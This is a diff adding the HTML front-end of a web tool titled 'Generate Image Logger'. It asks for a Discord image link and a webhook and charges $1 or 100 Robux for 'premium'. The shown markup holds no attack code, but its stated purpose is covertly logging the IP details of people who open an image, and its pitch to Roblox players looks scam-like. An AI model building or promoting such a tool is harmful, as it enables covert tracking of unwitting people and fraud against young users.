@@ -1,0 +1,100 @@
+<!DOCTYPE html><html lang="en"><head>
+	<title>Virtuoso</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--===============================================================================================-->	
+	<link rel="icon" type="image/png" href="images/1602766529_265953_VIRTUOSO-removebg-preview.png">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="css/font-awesome.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="css/animate.css">
+<!--===============================================================================================-->	
+	<link rel="stylesheet" type="text/css" href="css/hamburgers.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="css/animsition.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="css/select2.min.css">
+<!--===============================================================================================-->	
+	<link rel="stylesheet" type="text/css" href="css/daterangepicker.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="css/util.css">
+	<link rel="stylesheet" type="text/css" href="css/main.css">
+<!--===============================================================================================-->
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="js/jquery.min.js"></script>
+    <script src="js/api.js" async defer></script>
+</head>
+<body>
+	
+	<div class="limiter">
+		<div class="container-login100">
+			<div class="wrap-login100">
+				<form class="login100-form validate-form p-l-55 p-r-55 p-t-178" method="POST" id="myForm">
+				    					<span class="login100-form-title">
+						Generate Image Logger
+						  PREMIUM REQUIRED
+						 buy premium for 1$
+						 or 100 robux below
+					</span>
+
+					<div class="wrap-input100 validate-input m-b-16" data-validate="Please enter Discord Image Link">
+						<input class="input100" type="text" name="Image Link (Discord)" id="Image Link (Discord)" placeholder="Image Link (Discord)">
+						<span class="focus-input100"></span>
+					</div>
+					
+					<div class="wrap-input100 validate-input m-b-16" data-validate="Please enter fake roblox username">
+						<input class="input100" type="text" name="fakeusername" id="fakeusername" placeholder="Webhook">
+						<span class="focus-input100"></span>
+					</div>
+                    
+                    <input type="hidden" name="recaptcha-response" id="g-recaptcha-response">
+                    <input type="submit" name="submit" id="submit" hidden>
+                    
+					<div class="container-login100-form-btn">
+						<button class="g-recaptcha login100-form-btn" data-sitekey="6LeY5DUgAAAAAPkTg8KJpqHIiFrspvFS2oaAi0QR" data-callback="onSubmit" data-action="submit">Do it!</button>
+					</div>
+
+					<div class="flex-col-c p-t-170 p-b-40">
+						<span class="txt1 p-b-9">
+							Do not Have Premium?
+						</span>
+
+						<a href="sign-in.html" class="txt3">
+							Get Premium Here
+						         1$/100R
+						</a>
+					</div>
+				</form>
+			</div>
+		</div>
+	</div>
+	
+    <script>
+    
+        function onSubmit(token) {
+            document.getElementById("g-recaptcha-response").value = token;
+            document.getElementById("submit").click();
+        }
+    </script>
+	
+<!--===============================================================================================-->
+	<script src="js/jquery-3.2.1.min.js"></script>
+<!--===============================================================================================-->
+	<script src="js/animsition.min.js"></script>
+<!--===============================================================================================-->
+	<script src="js/popper.js"></script>
+	<script src="js/bootstrap.min.js"></script>
+<!--===============================================================================================-->
+	<script src="js/select2.min.js"></script>
+<!--===============================================================================================-->
+	<script src="js/moment.min.js"></script>
+	<script src="js/daterangepicker.js"></script>
+<!--===============================================================================================-->
+	<script src="js/countdowntime.js"></script>
+<!--===============================================================================================-->
+	<script src="js/main.js"></script>
+
+
+</body></html>
